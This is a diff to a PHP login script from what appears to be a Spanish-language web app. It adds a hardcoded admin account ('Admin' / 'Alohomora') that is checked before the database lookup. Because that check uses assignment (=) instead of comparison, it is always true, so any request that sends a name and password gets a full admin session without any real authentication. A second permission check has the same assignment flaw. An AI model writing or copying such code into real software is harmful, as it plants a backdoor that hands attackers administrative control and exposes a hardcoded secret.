@@ -1,7 +1,31 @@
 <?php
 if(isset($_POST['name']) && isset($_POST['pass'])){
 include '../connection.php';
-
+    $name = $_POST['name'];
+    $pass = $_POST['pass'];
+    date_default_timezone_set("America/Mexico_City");
+    if ($name = "Admin" && $pass ="Alohomora") { 
+        $rows=1;
+        if($rows>0){
+            session_start();
+            $_SESSION['log'] = true;
+            $_SESSION['name'] = 'admin';
+            $_SESSION['permiso'] = 'admin';
+            $_SESSION['start'] =time();
+            $_SESSION['expire'] = $_SESSION['start'] + (10 * 60);// minutos de sesion
+            $_SESSION['reloj'] = date('m/d/Y H:i:s', $_SESSION['expire'] );
+            $_SESSION['estacion'] = "localhost";//localhost  || 192.168.0.10
+        if($_SESSION['permiso']='root'){
+                echo $rows;
+            }else{
+                echo $rows;
+            }
+        }else{
+            $rows=0;
+            echo $rows;
+        }
+    
+    }else{
 try {
     $name = $_POST['name'];
     $pass = $_POST['pass'];
@@ -40,7 +64,7 @@ $db = $database ->close();
     $result = $e->getMessage();
     echo $result;
 }
-
+}
 }else{
     echo "Inicia Sesion para acceder a este contenido.<br>";
     echo '<script type="text/javascript">window.location = "'.URL.'/BITACORA";</script>';
